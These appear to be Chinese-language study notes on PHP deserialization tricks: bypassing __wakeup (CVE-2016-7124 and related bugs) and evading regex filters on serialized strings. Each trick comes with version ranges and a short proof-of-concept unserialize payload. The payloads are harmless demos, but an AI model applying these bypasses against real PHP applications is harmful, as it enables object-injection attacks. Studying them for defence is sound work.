# wakeup魔术方法绕过

## CVE-2016-7124

条件：

- 5.0.0 - 5.0.5
- 5.1.0 - 5.1.6
- 5.2.0 - 5.2.17
- 5.3.0 - 5.3.29
- 5.4.0 - 5.4.45
- 5.5.0 - 5.5.38
- 5.6.0 - 5.6.24
- 7.0.0 - 7.0.9

测试脚本 \<https://3v4l.org/a4BrQ\>

```php
<?php

class test{
	public $a='a';

	public function __construct(){

	}

	public function __destruct(){
		echo $this->a;
	}

	public function __wakeup(){
		$this->a='b';
	}
}


// echo serialize(new test());
// O:4:"test":1:{s:1:"a";s:1:"a";}

unserialize('O:4:"test":2:{s:1:"a";s:1:"a";}');
```

## CVE-2016-7124的绕过

条件：

- 7.0.0 - 7.0.14
- 7.1.0
- 5.4.14 - 5.4.45
- 5.5.0 - 5.5.38
- 5.6.0 - 5.6.29

测试脚本 \<https://3v4l.org/iLSA7\>

```php
<?php
//https://3v4l.org/iLSA7
//https://bugs.php.net/bug.php?id=73367
class obj {
	var $ryat;
	function __wakeup() {
		$this->ryat = null;
		throw new Exception("Not a serializable object");
	}
	function __destruct() {
		if ($this->ryat == 1) {
			var_dump('dtor!');
		}
	}
}

$poc = 'O:3:"obj":2:{s:4:"ryat";i:1;i:0;O:3:"obj":1:{s:4:"ryat";R:1;}}';
unserialize($poc);

?>
```

## 使用C代替O

条件：

- 5.3.0 - 5.3.29
- 5.4.0 - 5.4.45
- 5.5.0 - 5.5.38
- 5.6.0 - 5.6.40
- 7.0.0 - 7.0.33
- 7.1.0 - 7.1.33
- 7.2.0 - 7.2.34
- 7.3.0 - 7.3.28
- 7.4.0 - 7.4.16
- 8.0.0 - 8.0.3
- 只能执行construct()函数，无法添加任何内容

测试脚本 \<https://3v4l.org/YAje0\>

```php
<?php
//https://3v4l.org/YAje0
//https://bugs.php.net/bug.php?id=81151
class E  {
	public function __construct(){

	}

	public function __destruct(){
		echo "destruct";
	}

	public function __wakeup(){
		echo "wake up";
	}
}

var_dump(unserialize('C:1:"E":0:{}'));
```

## 利用反序列化字符串报错

利用条件：

- 7.0.15 - 7.0.33
- 7.1.1 - 7.1.33
- 7.2.0 - 7.2.34
- 7.3.0 - 7.3.28
- 7.4.0 - 7.4.16
- 8.0.0 - 8.0.3
- 利用一个包含\_\_destruct方法的类触发魔术方法可绕过\_\_wakeup方法。

```php
<?php

class D {

    public function __get($name) {
        echo "D::__get($name)\n";
    }
    public function __destruct() {
        echo "D::__destruct\n";
    }
    public function __wakeup() {
        echo "D::__wakeup\n";
    }
}

class C {
    public function __destruct() {
        echo "C::__destruct\n";
        $this->c->b;
        
    }
}


unserialize('O:1:"C":1:{s:1:"c";O:1:"D":0:{};N;}');
```

# 序列化字符串正则绕过

## 字符O绕过

条件：

- <7.1.33

测试脚本：\<https://3v4l.org/YclXi\>

```php
<?php
//https://3v4l.org/YclXi
class D {

}

class C {

}


unserialize('O:+1:"C":0:{}');
```

## 字符i、d绕过

条件：

- <8.0.3 （全版本）

测试脚本 \<https://3v4l.org/SJm2g\>

```php
<?php
//https://3v4l.org/SJm2g
// echo serialize(0);

echo unserialize('i:-1;');
echo "\n";
echo unserialize('i:+1;');
echo "\n";
echo unserialize('d:-1.1;');
echo "\n";
echo unserialize('d:+1.2;');
```

